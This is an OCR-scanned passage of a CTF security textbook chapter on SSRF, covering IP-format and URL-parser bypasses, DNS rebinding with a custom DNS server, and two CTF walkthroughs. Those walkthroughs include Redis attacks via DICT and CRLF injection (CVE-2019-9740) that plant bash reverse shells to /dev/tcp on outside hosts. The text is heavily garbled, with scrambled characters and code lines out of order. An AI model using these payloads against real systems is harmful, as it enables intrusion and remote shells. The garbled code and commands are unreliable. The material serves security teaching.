64 bytes from 127.e.0.1: icmp_seq=1 ttl=64 time=9.044 ms
64bytes from 127.0.0.1: icmp_seg=2 tt=64 time=θ.055 ms
64 bytes from 127.e.0.1: icmp_sequ3 ttl=64 timen9.108 ms
64 bytes from 127.e.0.1: icmp_seq=4 ttl=64 time=θ.095 ms
-0ping statistics ...
4 packets transmitted, 4 received, 0t packet loss, time 3896ms
rtt min/avg/max/mdev = 0.644/0.875/0.108/0.828 ms
[roote33e63029d1da cron]#
Fig, 2.23 Bypass result
[roote33e63029d1da cron]#ping 127.1-c 4
PING 127.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.8.8.1: icmp_seq=1 ttl=64 time=0.861 ms
64 bytes from 127.0.0.1: icmp_seq=2 tt1=64 time=0.108 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.108 ms
64 bytes from 127.0.0.1: icmp_seq=4 tt1=64 time=0.071 ms
-127.1 ping statistics -.
rtt min/avg/max/mdev =0.061/0.687/0.168/e.021ms
4packets transmitted,4received, B% packet loss, time 3188ms
[roote33e63029d1da cron]#
Fig, 2.24 Bypass result
2.1.4.3 URL Resolution Issues
There have been several challenges in the CTF online competition that exploit
differences in component parsing rules and result in bypasses.
 ?php
highlight_file (FILE_) ;
function check_inner_ip (Sur1)
Snatch_result = preg_match (* /~ (http |https)? =\/\/ . * (\cr/) ? *S/ *,
fur1) ;
§match_result Smatch_result)
die ('url fomat error′) ;
txy
Sur1_parse=parse_ur1 (Sur1) ;
---
## Page 118
102
2 Advanced Web
roote144ea1ddb187:/var/uww/html# curl -v http://127.0.0.1.xip.io
Rebuilt URL to:http://127.0.0.1.xip.io/
Trying127.0.0.1...
TCP_NOOELAY set
Connected to 127.0.0.1.xip.io (127.0.0.1) port 88(#0)
GET/HTTP/1.1
>Host: 127.0.8.1.xip.io
User-Agent: cur1/7.52.1
>Accept:*/*
Foundc/a,
0146ez
187:/var
cn left
tnla
intact
Fig, 2.26 Use shot URL bypass
---
## Page 119
2.1 SSRF Vulnerabilities
103
34.1(10.83.11 00
Fig, 2.27 Use 302 bypass
catch (Exception Se)
die (*ur1 fomat error') ;
return false;
Shostname = Surl_parse ['host '] ;
Sint_ip = ip21ong ($ip) ;
1 (aweusous) oueuAqasoqaa6 = ds
return ip21ong (*127.0.0.0′) >>24 == $int_ip>>24 11 ip21ong
('10.0.0.0') >>24 *
$int_ip>>24 11 ip21ong (*172.16 0.0′) >>20 == $int_ip>>20 11
p21ong(′192.168.0.0′) >>16 == $int_1p>>16;
function safe_request_url (Sur1)
if (check_innez_ip (Sur1))
echo Sur1. * is inner ip′ :;
else
[
$ch = curl_init () ;
cur1_setopt (Sch, CURLoPr_URL, Sur1) ;
curl_setopt (Sch, CURLOPT_RETURNTRANSFER, 1) :
cur1_setopt (Sch, CURLOPT_HEADER, 0) ;
Soutput = cur1_exec ($ch) 
Sresult_info = cur1_getinfo ($ch) ;
if (Sresult_info[′redirect_url′]}
safe_request_ur1 (Sresult_info ['redirect_ur1°]1 ;
cur1_close (Sch) ;
var_dump (Soutput) ;
 [ txn., ]as = txns
---
## Page 120
104
2 Advanced Web
9 0 4
safs_reqos_sel(lreetis_inte(°#
Fig, 2.28 Get flag
if (1empty (Sux1) ) (
safe_request_url (Surl) ;
? >
If the URL is _COPY0@ 127.0.0.1:PI:EMAIL, then enter safe_request_url,
parse_url get the host is baidu.com, and curl get is 127.0.0.1:80, so the detection of
IP is a normal one, The website domain name and the actual curl request are
constructed as 127.0.0.1, which achieves the SSRF attack, and the operation to
obtain the flag is shown in Fig. 2.28.
In addition to PHP, different languages have different ways of parsing URLs. For
more information, please refer to https://www.blackhat.com/docs/us-17/thursday/
us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser.-In-Trending-Program
ming-Languages.pdf.
2.1.4.4 DNS Rebinding
In some cases, filtering for SSRF may occur as follows: the host is extracted from the
incoming URL, then DNS resolution is performed, the IP address is obtained, the IP
address is checked to see if it is legitimate, and if it passes, then the curl is requested
again. If the DNS resolution of the first request retums a normal address, but the
DNS resolution of the second request returms a malicious address, then the DNS
rebinding attack is complete.
---
## Page 121
2.1 SSRF Vulnerabilities
105
Type
Nam
Value
points to 127.0.0.1
points to 123.125.114.144
Fig, 2.29 Two reconds
A DNS rebinding attack first requires the attacker to have a domain name of its
own, usually in two ways. The first is to bind two records, see Fig. 2.29, where the
resolution is random but not necessarily alternate. Therefore, this method requires a
certain probability of success.
The second approach is more stable, where you build your DNS server and run
your resolution service on it so that it returns something different every time.
Add two resolutions to the domain name, an A record to the server address and an
NS record to the address of the previous record.
The DNS Server code is as follows:
from tvisted.internet import reactor, defer
from tvisted.names import client, dns, error, server
class DynamicResolver (object) :
record={}
def _doDynamicResponse (self, query) :
name = query .name .name
if name not in record or record [name] > Di6 9.18.6 > d7cb7b72.s.#ln,pw
global options: +cnd
>>HEADERcc-opcode: QUERY， status:NOERROR,id:36757
Got answer:
flagS:qr rd ra; QUERY:1, ANSWER:1, AUTHORITY:0,ADDITIONAL: 1
OPT PSEUDOSECTION:
：EDNS:version:0，flags:;udp:512
QUESTION SECTION:
d7cb7b72.s.w1n.pw.
IN
ANSNER SECTION:
d7cb7b72.s.w1n.pw.
37
IN
8.8.8.8
Query time:10 nsec
:SERVER:114.114.114.114#53(114.114.114.114)
: WHEN: Sun May 26 22:19:22 CST 2819
MSG S1ZE rcvd: 62
→ - dig d7cb7b72.s.wln.pw
> Di6 9.18.6  d7cb7b72.s.1n.pw
global options: +cnd
Got ansmer:
->>HEADERcC- opcode: QUERY, status: NOERROR,Id:21458
flags:qr rd ra;QUERY:1,ANSWER:1,AUTHORITY:0,ADDITIONAL: 1
EDNS:verslon:0，flags:;dp：512
QUESTION SECTION:
d7cb7b72.s.wln.pw.
IN
d7cb7b72.s.wtn.pw.
ANSWER SECTION:
IN
127,0.0.1
:Query time:6 msec
SERVER: 114.114.114.114#53(114.114.114.114)
:WHEN: Sun May 26 22:19:23 CST 2819
MSG SIZE rcvd: 62
Fig, 2.30 Result
reactor. 1istentDp (53, protocol)
reactor,zun ()
if __nane
raise SystemExit (main () )
_nain__' :
The results of the request are shown in Fig. 2.30.
---
## Page 123
2.1 SSRF Vulnerabilities
107
2.1.5 SSRFinthe CTF
1. Web300 short domain name tool for the 13th CUIT school competition, Fat
Harbor Cup
The WAF will resolve the domain’s IP address the first time and then determine if it
is an intranet IP. If not, then use CURL to request the domain. This involves the
CURL requesting the domain name a second time, resolving it, and then making a
new request to the DNS server for an intranet IP, thus bypassing the restriction. See
Sect 1.3.4.4 for the actual effect.
In the title, request htp://domain/tools.php?a=s&u=http:/ip:88/_testok equal
to http://127.0.0.1/ tools.php?a=s&uhttp:/ip:88/_testok; meanwhile, information
can be gathered from the There is a lot of helpful information available in phpinfo,
such as the host of Redis, as shown in Fig. 2.31.
In addition, libcurl is an older version of 7.19.7, which only supports TFTP, FTP,
Telnet, DICT, HTTP, and FILE protocols, and generally uses the Gopher protocol to
attack Redis, but uses the DICT protocol to aftack Redis as well.
54.223 . 247. 98 :2222/too1s -php7a=s&u=dict : //www.x. cn: 6379/config:
set :dix : /vax/spoo1/cron/ 54 .223 .247.98 :2222/too1s -pbp?a=s&u
=dict : //www . x . cn : 6379/config : set : dbti1ename :zoot 54 . 223 . 247 . 98 : 2222/
too1s php?a=s&u=dict : / /www .x. cn: 6379 /set : 0 : \,x0a^,x0a*/1\cr x20*
\x2 0*\x20/bin/bash^,x20 1\,x20>x26\,x20/dev/tcp/vp=/8888^,x200>,x261
\x2 0 *\x20 * ,
x0a,x0a\x0a* 54 .223 .247,98:2222/too1s -php7a=s&u=dict: / /vww.x.
cn : 6379/save
The results of the attack are shown in Fig. 2.32.
2. Guard net cup 2019 easy_python
There was a challenge on SSRF attacks on Redis in the 2019 NetProtection Cup. We
replayed the topic after the game and analyzed it as an example.
Ervironment
Fig, 2.31 phpinfo
---
## Page 124
108
qPM peouapy 
[rootei~]#nc-vlp8886
Connection from 54.223.247.98:35820
bash: no job control in this shell
[root@33b160582bff ~]# 1s
1.s
naconda-ks.cfg
deod.letter
flog_in_here
install.log
install.log.syslog
[roote33b160582bff~]#cat flag_in_here
cat flog_in_here
Orz!
This is flog:
SYC{7aef12345e2oo21ae8f97co8b5d9e581}
[roote33b160582bff~]#
Fig, 2.32 Get flag
First, log in at random and find a session value for the flask, and after logging in,
make a request to your VPS as a function of the request, and you will get the
information shown in Fig. 2.33.
The critical information is that Python 3 and urllib are used, and viewing the
return package yields the information shown in Fig. 2.34.
Fig. 2.33 Get the
4uuNya
information
nc-1vv1234
GET / HTTP/1.1
Accept-Encoding:identity
Host: 172.20.10.2:1234
User-Agent: Python-urllib/3.7
Connection: close
Fig. 2.34 Response
Response Headers
view source
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=utf-8
Date:Sun,08 Dec 2019 08:53:56 GMT
Server: nginx/1.10.3
---
## Page 125
2.1 SSRF Vulnerabilities
109
000
Tpe Nos
Felead
茶茶
721
HTT/1.1200OK
nt-Type: ag
O cepe
Tepe 
Fig, 2.35 Traverse common filenames
Seeing the Nginx in the retumed package, an experienced participant would guess it
is a directory traversal vulnerability due to an Nginx configuration error /_pycache_
to get the pyc file. Without knowing the filename, it is possible to traverse common
filenames to get main.cpython-37.pyc and views.cpython-37.pyc, see Fig. 2.35
The request function was then tested and found that requests for local addresses
were not allowed, see Fig. 2.36.
It is straightforward to bypass the local filtering here, and the code is not very
strict, use 0 for localhost, see Fig. 2.37.
This is the first time I have used CVE-2019-9740 (Python urllib CRLF injection)
to attack Redis. We can write a malicious serialized string through this CRLF
vulnerability and then visit the page to trigger a bounce back to the shell to write
the malicious string. The serialized string code is as follows.
import requests
import sys
import ur11b
import pick1e
class Exploit (1 :
def _init__(self, host, port) :
self ur1 = *http: / /vs:$s*  (host, port)
self.reg = requests.
def random_str (self) :
inport random, string
return '' .join (random.sample(string-ascii_1etters, 10) )
---
## Page 126
110
2 Advanced Web
Fig, 2.36 Local addresses
not allowed
test
请求地址：http://127.0.0.1
提交
hacked
Hellotest
请求地址：
Redirecting..
Fig, 2.37 Bypass result
def do_exploit (self) :
self .reg-post (self. url + */login/', data= {*use
* : self.
random_stz()})
11c0fb7df25a*\x80\,er\cx′,x80\,cr\n
pay1oad2 = +0 :63797^,r\nS8T session:34d7439d-d198 -4ea9-bcc6 
x03cposix\,cxnsystem\,ng\cx\,x,x00′,x00\,x\,x00\,x00bash -c\,cx\*sh
- 1 >& /dev/tcp/
res = self .reg-post (self .ur1 + */request/', data={
172 . 20 , 0 3/1234 0>&1\cx"qx\,x01^\,x85g,x02Rg\,x03 *\z\,n
/EEEz:, + zpeo/ed + //:dq =,txn,
print (res.content)
})
if
exp = Exploit (ays argv[1] , sys argv[2] 
_nane_
exp do_exploit ()
By looking at the information in the pop-up shell, you can see that you need to
perform a power-up. See Fig. 2.38.
m pasms st sipog ep peanau Suoea uoou s a Suas ray
root access, but it is not practical to write SSH private keys and webshells, etc., so it